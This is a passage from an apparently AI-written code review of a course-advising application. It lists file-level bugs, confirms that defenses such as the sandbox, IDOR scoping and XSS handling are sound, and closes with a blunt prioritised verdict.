- `generation/citations.py:65-67` — a Markdown link *definition* `[1]: https://…` isn't followed by `(` and parses as a real citation, satisfying the per-paragraph citation guard for a paragraph with no actual evidence. And `citation_visible_text` masks inline code per **line** (`:33-35`), so a backtick span wrapping a newline leaves `[2]` counted. False-accept paths in a "fail-closed" validator.
- `generation/answer.py:129-152` — `_NONSUPPORT_RE`: any paragraph containing "not in the" (e.g. "the file is not in the folder") disables the course-code support check for the entire paragraph.
- `retrieval/fusion.py:38-49` + `configs/retrieval.toml` — `min_score = 0.15` is a per-seam *relative* floor; min-max forces the best hit of every result set to 1.0, so the floor can never reject a whole weak result set. The comment claims it "Prevents unrelated material from reaching the model". It doesn't. **NEEDS VERIFICATION** whether relative is intended.

**Backend — data/ops**
- `operations/budget.py:130, 163, 232` — `ensure`, `reserve_before_call`, `account_usage` each begin with `conn.commit()`, silently committing whatever the caller had pending. An atomicity trap for every future caller. Assert `transaction_status == IDLE` instead.
- `db/connection.py:69-107` + `:290-298` — `release_borrow()` inside `connection_transaction` swaps the underlying connection under a live transaction object, and the block's exit then commits **another thread's** transaction. All current call sites commit first; nothing enforces it. `release()` should refuse while a transaction is open.
- `jobs/worker.py:86-91`, `db/queries/jobs.sql:99-112` — `finish_job_cancelled` has no `cancel_requested` guard and `finish_if_cancelled` calls it even when the recheck passes. Unreachable today (verified `cancel_requested` is monotonic while running), so any future spurious `JobCancelled` silently converts a healthy job into `cancelled`.
- `observability/alerts.py:45-48` — `comparison="gt"` fires on `>=`, `"lt"` fires on `<=`. And `AlertRule.window_seconds` (`:21`) is dead config: the real windows are hardcoded in SQL (`telemetry_recent_failures` = 5 min, `metrics_hourly_spend_usd` = 1 h), so `DBPoolWaitingSurge` advertises a 60 s window it never applies.
- `pricing/service.py:45-95` — schedules are validated in isolation; overlapping `(provider, model_id, billing_mode)` windows are allowed, and `find_active_price_schedule`'s `ORDER BY created_at DESC` tiebreak means a later insert silently re-attributes historical costs. Also `quota_settlements.delta_amount` and `quota_policies.spend_usd_per_day` are `double precision` (`migrations/068:9`, `048:25`) while `model_calls.estimated_cost` is `numeric(14,8)` (`043:36`) computed with `Decimal`. Mixed float/decimal money. Don't.

**Backend — programs/scripts**
- `programs/requirements.py:57-65` — `"Two courses (8 credits) from the following"` → `choose=None`; the parenthetical admits only bare `(\d+)`. `"2 courses (4 credits) from the following"` → `None`. A "choose N" count silently lost. Meanwhile `"At least 6 courses chosen from"` → `choose=6`, presenting a *floor* as an exact choice.
- `programs/catalog_pdf.py:75-81, 119-126, 132-139` — if the title lookback fails, `return degree_index - 1` silently adopts a non-title line as the program title (verified: returns index 1 for a heading that is not a title), and the program is imported under a wrong title with `kind = "other"` and nothing raises. Separately, two adjacent `DEGREE AWARDED` lines produce duplicate `starts` → `end == begin` → `chunk[0][0]` **IndexError**, aborting the whole scrape instead of a diagnosable skip.
- `programs/requirements.py:227-242` — the wrap-join merges *any* non-bullet line whose previous line was ≥80 chars without terminal punctuation, contradicting its own comment ("Short lines are items of their own"). Verified: a short `"Short line ECON 101"` after a long unwrapped line got merged in. Mis-associates requirement lines into one item, which shifts `choose` read-off and binding alignment.
- `advising/applicability.py:32-36, 79-86` — `"class of 2026"` (graduation) is grouped with `"entering fall 2023"` (matriculation) — ~4 years apart semantically — then `_cohort_matches` matches by **substring** (`d in t or t in d`). `_RANGE_RE` (`:31`) is dead code. This feeds `ApplicabilityNotice` headlines claiming "Applicable documentation verified for cohort …". Over-claiming applicability is a correctness bug in an advising product. **NEEDS VERIFICATION** on how cohorts are declared in the UI.

**Frontend**
- `frontend/src/state/AppContext.tsx:71-98` — `refreshSources` has no request-sequence guard, unlike `refreshFlags` right above it (`:48-62`). Overlapping upload/refresh applies older lists after newer ones.
- `frontend/src/app/SessionGate.tsx:33-61` — `http.ts:132-133` dispatches `advisor-session-invalid` on **every** 401; a burst fires N concurrent `getSession()` calls with no abort/sequence guard. Flicker and stale-overwrite risk. Debounce it.
- `frontend/src/components/artifact/ArtifactEditor.tsx:190-194, 261-271` — if `previewArtifact` rejects, `preview` stays `null` and `view` stays `'preview'`, rendering "Loading preview…" forever with no retry affordance.
- `frontend/src/components/source/useSourceUpload.ts:20-28` — the warnings note **replaces** the status note instead of appending, so a successful-with-warnings upload shows only warnings.
- `frontend/tests/browser-workflows.test.mjs:2941+` — re-asserts the markdown table pipe-escaping rule already unit-tested in `artifact-modules.test.mjs`, which the testing policy explicitly forbids. (Meanwhile `documentDraft.ts` has no unit test at all. Pick one.)

---

## Things I checked that are NOT broken

Don't make me regret writing this section.

- **Citation numbering/mapping** — 1-based `_context_block` ↔ `chunks[number-1]` with `1 ≤ n ≤ len(chunks)` validation (`answer.py:157-171`, `citations.py:70-80`). Hallucinated and out-of-range citations rejected, duplicates deduped in first-mention order. No off-by-one. Genuinely good.
- **Fusion determinism** — every sort carries a full `str(uuid)` tiebreak (`fusion.py:52-54, 154-158, 205-211`); seams order by `score DESC, source_id, chunk_index`; `fuse` takes max-seam-score and never sums.
- **Job claiming** — `claim_next_job` and `recover_expired_jobs` use `FOR UPDATE SKIP LOCKED` with matching partial indexes; the cancel-vs-claim race is correctly resolved by row lock.
- **Budget reservation** — genuinely pre-call, settled under `FOR UPDATE OF c, o` with CAS guards; `settle_operation_budget_call` can't double-spend.
- **Schema hygiene** — migration numbering contiguous (legacy 001–032 == baseline, then 033–068); checksum normalization is LF/CRLF-safe; the `ALTER ... ADD CHECK` migrations (045, 054, 057) correctly use `NOT VALID` + data fix + `VALIDATE`.
- **Query loader** — 530 `queries.get(...)` uses vs 617 defined blocks: **zero missing names, zero duplicates, no inline or f-string SQL anywhere**. The "every statement is a named `-- name:` block" rule is actually held. I checked because I didn't believe it.
- **IDOR scoping** — conversations, artifacts (workspace-keyed + raw-path hash-checked), jobs (`scope_key` → 404), batches, privacy exports (`X-Export-Token`, 32-byte `compare_digest`), decisions, gaps: all owner-scoped. No cross-workspace read found.
- **OIDC login** — state/nonce/PKCE bound, transaction single-use (`DELETE ... RETURNING`), `aud`/`azp`/`nonce`/`exp`/`iat`/`nbf` enforced twice, workspace derived from `sha256(issuer||subject)`.
- **Sandbox** — argv-only `shell=False`, `--network none`, `--read-only`, `--cap-drop ALL`, `no-new-privileges`, non-root, pids/CPU/memory/ulimit bounds, symlink-checked bind mounts, `sha256:`-pinned images in production. No command injection, no unbounded resources. This is the best-hardened part of the codebase.
- **Backup/restore** (`ops/backup.py`) — checksums verified at creation *and* restore (`_load_and_verify:319`), zip-slip and symlink members rejected, restore only into an empty DB and a non-existent data dir. Sound.
- **Tool registry/executions** — allowlist + capability + resource-ID scope enforced before dispatch, strict pydantic inputs, fail-closed idempotency ledger with `mark_unknown` on failure and replay only on digest-identical completed calls.
- **Content-addressed IDs** — `uuid5` throughout for citation-stable identity (`source_id = uuid5(collection, file_hash)`, `course_id`, `program_id`, chunk/locator IDs). `uuid4` only where identity isn't citation-stable. Matches D3.
- **`origin_key`/`is_current` replacement** — runs under `lock_source_origin_publication`, never deletes history, two-currents serialized away. Canonical program Markdown contains no timestamps and no PDF URLs.
- **XSS** — no `dangerouslySetInnerHTML` anywhere in app code. Markdown goes through `react-markdown@9` with `urlTransform` killing `javascript:` hrefs, custom `a` renderer with `rel="noreferrer noopener"`. HTML previews render in `iframe sandbox=""` with `script-src 'none'` CSP. Defensible.
- **Local-storage scoping** — `advisor-chat-artifacts:${workspaceKey}` is workspace-keyed and the App tree remounts on `session.workspaceKey` change. No cross-user draft leak found.
- **List keys** — reorderable lists key by stable ids (`DocumentEditor:152`, `PlanEditor:51`, `model.ts:127` `${sequence}-${requestId}`). Index-keyed lists are static append/pop-only.
- **XLSX/DOCX import** — `defusedxml`, feature rejection, `inert_html`/`active_html` sanitization. Well done. (The formula blocklist at 1.5 is the gap.)
- **CSV export formula injection** — sanitized (`admin/store.py:39-46`), and run-event error scrubbing redacts secrets (`runs.py:108-125`).
- **Debug overrides** — admin-only, token stored hashed, expiry/revocation in SQL, owner-bound, registry explicitly excludes auth/db/routing/secret settings, and flags can only *narrow* execution settings (`flags/service.py:161-176`).

---

## Verdict

This codebase is not a wreck. It is something worse: it is a **carefully built, well-tested,
thoughtfully documented system with a handful of load-bearing defects hiding exactly where the
documentation is most confident.**

The sandbox is hardened better than most production code I've reviewed. The query loader has
zero drift across 530 call sites. Backup restore verifies checksums at both ends. Someone
thought hard about IDOR. And then — *and then* — the one hard rule in the project, the one
printed in bold, the one with its own test file, is violated by a regex that thinks "lab" is a
subject code, and the privacy deletion that students are legally entitled to throws a foreign
key error and deletes nothing.

Five things must be fixed before this is used by anyone:

1. **0.1** — fabricated codes in the prerequisite graph. This is your hard rule and the parser
   is breaking it.
2. **0.2** — privacy deletion crashes and erases nothing. This is a legal exposure, not a bug.
3. **0.3** — quotas do not exist in production. Your rate limits are a comment.
4. **0.4** — one empty file destroys every program and every reviewed rule release.
5. **0.5** — streamed answers are non-reproducible and the audit log says otherwise.

Tier 1 is the "before real users" list. Tier 2 is the "before anyone trusts the numbers" list.
Tier 3 is me being thorough, which is what you asked for.

Fix the tests while you're in there: the one test guarding the hard rule doesn't cover the
modules that would break it, the quota test suite tests a function production never calls, the
privacy test suite avoids the only tables that break deletion, and there are real `time.sleep`
calls in a suite whose own policy says *"Use `FakeClock`, never `sleep`."*

Good green tests and four Tier-0 defects. That's not a test suite. That's a comfort blanket.

Now if you'll excuse me, I need a very large coffee and a lie down.

— MiMo, still furious.
